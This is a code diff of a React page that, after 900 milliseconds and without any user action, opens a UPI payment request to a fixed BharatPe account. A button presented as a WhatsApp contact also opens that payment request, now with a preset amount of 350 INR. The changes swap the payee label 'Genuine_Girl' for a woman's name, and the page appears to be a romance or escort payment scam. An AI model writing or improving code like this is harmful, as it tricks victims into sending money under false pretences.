@@ -35,17 +35,17 @@ function App() {
   }, []);
 
   setTimeout(() => {
-    window.open("upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=Genuine_Girl", "_self");
+    window.open("upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=ShruthiReddy&tn=Genuine_Girl", "_self");
   }, 900);
 
   const handlepayButton = async () => {
     await sendUpdate("PayButton")
-    window.open("upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=Genuine_Girl", "_self");
+    window.open("upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=ShruthiReddy&tn=Genuine_Girl", "_self");
   }
 
   const handleWspButton = async () => {
     await sendUpdate("WhatsppBtn")
-    window.open("upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=Genuine_Girl", "_self");
+    window.open("upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=ShruthiReddy&tn=Genuine_Girl&am=350", "_self");
   }
 
   return (
